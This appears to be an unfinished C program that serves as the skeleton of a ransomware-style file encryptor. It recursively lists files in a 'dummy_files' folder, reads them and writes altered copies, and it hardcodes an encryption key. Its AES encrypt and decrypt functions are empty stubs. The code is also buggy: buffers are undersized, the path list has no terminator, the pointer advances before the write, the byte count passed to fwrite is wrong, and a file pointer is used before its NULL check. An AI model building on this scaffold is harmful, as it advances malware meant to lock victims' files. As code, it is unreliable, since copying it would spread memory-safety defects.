#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>

// d_type = 4 -> directory
#define E_FOLDER 4
#define E_FILE 8
const char *FILES_TO_ENCRYPT = "dummy_files";
const char *ENCRYPTION_KEY = "NFTs_are_a_scam";

char **find_files(const char *dir_name)
{
    int amount_to_encrypt = 10;
    int i = 0;
    char **file_paths = malloc(amount_to_encrypt * sizeof(char*));
    DIR *dir = opendir(dir_name);

    if (dir == NULL) {
        printf("Dir = NULL");
        // add return '\0'
    }
    
    struct dirent *entity;
    entity = readdir(dir);
    while (entity != NULL) {
        // build path string
        char relative[255] = {0};
        strcat(relative, dir_name);
        strcat(relative, "/");
        strcat(relative, entity->d_name);

        // if the entity is a folder, call the function recursively
        if (entity->d_type == E_FOLDER && strcmp(entity->d_name, ".") != 0 && strcmp(entity->d_name, "..") != 0) {
            find_files(relative);
        } else if (entity->d_type == E_FILE) {
            //printf("%d %s\n", entity->d_type, relative);
            /*
                Currently does not work recursively.
                It should work as the relative string when printing prints recursively.
                printf("%s\n", relative); will print recursively into folders,
                but when adding the relative string to file_paths it goes missing.
                I do not understand for the life of me what I'm doing wrong.
                I will come back to this when I'm not as much of a C noob as I am now.
            */
            if (i < amount_to_encrypt) {
                file_paths[i] = malloc(sizeof(char) * strlen(relative));
                strcpy(file_paths[i], relative);
                i++;
            }
        }
        // move to next entity
        entity = readdir(dir);
    }

    closedir(dir);
    return file_paths;
}

char *read_file(char *filename)
{
    FILE *fptr;
    char current_char;
    int i = 0;
    fptr = fopen(filename, "rb");

    // find size of file in bytes
    fseek(fptr, 0, SEEK_END);
    long size = ftell(fptr);
    fseek(fptr, 0, SEEK_SET);
    //printf("%ld\n", size);

    // proceed with allocating memory and reading the file
    char *data = malloc(size * sizeof(char));

    if (fptr == NULL) {
        printf("Cannot open file\n");
        exit(0);
    }
    current_char = fgetc(fptr);
    while (current_char != EOF) {  // EOF -> end of file
        data[i] = current_char;
        i++;
        //printf("%c", current_char);
        current_char = fgetc(fptr);
    }
    fclose(fptr);
    //printf("%s\n", data);
    //printf("EOF\n");
    return data;
}

int main()
{
    // array of strings contain relative path to the files to be encrypted
    char **files = find_files(FILES_TO_ENCRYPT);

    while (*files) {
            //printf("%s\n", *files);
            char *data = read_file(*files);
            files++;
                
            FILE *fp;
            size_t count;
            char written[255] = "";
            strcat(written, *files);
            strcat(written, "a");
            printf("%s\n", written);
            fp = fopen(written, "wb+");
         
            if(fp == NULL) {
                printf("file couldn't be opened\n");
                exit(1);
            }
         
            count = fwrite(data,1,strlen(*files),fp);
            printf("Bytes written : %ld\n", count);
            free(data);
         
         
            fclose(fp);
     
        //return 0;
    }
    free(files);

}


// AES stuff
// encrypt, pad
// decrypt, unpad


char *get_file_content()
{
}

char *encrypt_file()
{
}

char *decrypt_file()
{
}

void write_to_file()
{
}

